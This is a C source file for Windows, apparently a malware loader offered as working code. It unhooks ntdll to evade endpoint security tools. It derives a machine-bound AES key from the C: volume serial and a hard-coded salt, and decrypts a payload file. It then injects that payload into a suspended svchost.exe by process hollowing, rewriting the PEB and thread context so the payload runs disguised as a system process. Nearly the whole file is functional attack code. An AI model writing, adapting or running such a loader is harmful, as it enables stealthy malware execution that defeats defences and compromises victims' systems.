#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")
#define TAG_SIZE 16
#define IV_SIZE 12
#define KEY_SIZE 32
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_NOT_MAPPED_VIEW ((NTSTATUS)0xC0000019L)

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type   : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

void DeriveKey(BYTE* outKey) {
    DWORD volumeSerial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);
    
    BYTE seed[sizeof(DWORD) + 8];
    memcpy(seed, &volumeSerial, sizeof(DWORD));
    memcpy(seed + sizeof(DWORD), "MyS@lt!2", 8);
    
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, seed, sizeof(seed), 0);
    BCryptFinishHash(hHash, outKey, KEY_SIZE, 0);
    
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}

void RefreshNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return; }
    
    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    if (pCleanNtdll && hNtdll) {
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHeader->e_lfanew);
        
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders) + i;
            if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                DWORD oldProtect;
                PVOID pTargetAddr = (PVOID)((DWORD_PTR)hNtdll + pSection->VirtualAddress);
                PVOID pSourceAddr = (PVOID)((DWORD_PTR)pCleanNtdll + pSection->VirtualAddress);
                if (VirtualProtect(pTargetAddr, pSection->SizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    memcpy(pTargetAddr, pSourceAddr, pSection->SizeOfRawData);
                    VirtualProtect(pTargetAddr, pSection->SizeOfRawData, oldProtect, &oldProtect);
                }
            }
        }
    }
    if (pCleanNtdll) UnmapViewOfFile(pCleanNtdll);
    if (hMapping) CloseHandle(hMapping);
    if (hFile) CloseHandle(hFile);
    printf("[+] Ntdll unhooked\n");
}

void PerformRelocation(PBYTE pPayload, PVOID pRemoteImage, PIMAGE_NT_HEADERS pNtHeaders) {
    DWORD_PTR delta = (DWORD_PTR)pRemoteImage - pNtHeaders->OptionalHeader.ImageBase;
    if (delta == 0) return;

    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size == 0) return;

    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pPayload + relocDir.VirtualAddress);
    while (pReloc->VirtualAddress != 0) {
        DWORD entriesCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY pEntries = (PBASE_RELOCATION_ENTRY)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < entriesCount; i++) {
            if (pEntries[i].Type == 0) continue;
            PVOID pAddressToPatch = (PVOID)(pPayload + pReloc->VirtualAddress + pEntries[i].Offset);
#ifdef _WIN64
            if (pEntries[i].Type == IMAGE_REL_BASED_DIR64) *(DWORD64*)pAddressToPatch += (DWORD64)delta;
#else
            if (pEntries[i].Type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)pAddressToPatch += (DWORD)delta;
#endif
        }
        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
    }
}

void decryptAndRun(const char* encryptedPath, BYTE* key) {
    FILE* f = fopen(encryptedPath, "rb");
    if (!f) { printf("[-] File not found\n"); return; }
    
    BYTE iv[IV_SIZE], tag[TAG_SIZE];
    fread(iv, 1, IV_SIZE, f);
    fread(tag, 1, TAG_SIZE, f);
    
    fseek(f, 0, SEEK_END);
    DWORD cipherSize = ftell(f) - IV_SIZE - TAG_SIZE;
    fseek(f, IV_SIZE + TAG_SIZE, SEEK_SET);
    
    BYTE* data = (BYTE*)malloc(cipherSize);
    fread(data, 1, cipherSize, f);
    fclose(f);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, KEY_SIZE, 0);

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv; authInfo.cbNonce = IV_SIZE;
    authInfo.pbTag = tag; authInfo.cbTag = TAG_SIZE;

    DWORD cbResult = 0;
    if (BCryptDecrypt(hKey, data, cipherSize, &authInfo, NULL, 0, data, cipherSize, &cbResult, 0) != 0) {
        printf("[-] Decryption failed\n");
        free(data); return;
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char targetProcess[] = "C:\\Windows\\System32\\svchost.exe";

    if (CreateProcessA(NULL, targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(data + dosHeader->e_lfanew);

        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
        NtUnmapViewOfSection(pi.hProcess, (PVOID)ntHeader->OptionalHeader.ImageBase);

        PVOID remoteImage = VirtualAllocEx(pi.hProcess, (PVOID)ntHeader->OptionalHeader.ImageBase, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteImage) remoteImage = VirtualAllocEx(pi.hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        PBYTE localBuffer = (PBYTE)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(localBuffer, data, ntHeader->OptionalHeader.SizeOfHeaders);
        
        for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(data + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
            memcpy(localBuffer + section->VirtualAddress, data + section->PointerToRawData, section->SizeOfRawData);
        }

        PerformRelocation(localBuffer, remoteImage, ntHeader);
        WriteProcessMemory(pi.hProcess, remoteImage, localBuffer, ntHeader->OptionalHeader.SizeOfImage, NULL);

        PROCESS_BASIC_INFORMATION pbi;
        typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        pNtQueryInformationProcess NtQueryInfo = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        
        if (NtQueryInfo(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) == STATUS_SUCCESS) {
            #ifdef _WIN64
                WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)pbi.PebBaseAddress + 0x10), &remoteImage, sizeof(PVOID), NULL);
            #else
                WriteProcessMemory(pi.hProcess, (PVOID)((DWORD)pbi.PebBaseAddress + 0x8), &remoteImage, sizeof(PVOID), NULL);
            #endif
        }

        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        #ifdef _WIN64
            ctx.Rcx = (DWORD64)((BYTE*)remoteImage + ntHeader->OptionalHeader.AddressOfEntryPoint);
        #else
            ctx.Eax = (DWORD)((BYTE*)remoteImage + ntHeader->OptionalHeader.AddressOfEntryPoint);
        #endif
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        
        printf("[+] Success: Process hollowed and running\n");
        VirtualFree(localBuffer, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    free(data);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

int main() {
    RefreshNtdll(); 
    BYTE key[KEY_SIZE];
    DeriveKey(key); 
    decryptAndRun("protected.bin", key);
    SecureZeroMemory(key, KEY_SIZE);
    return 0;
}
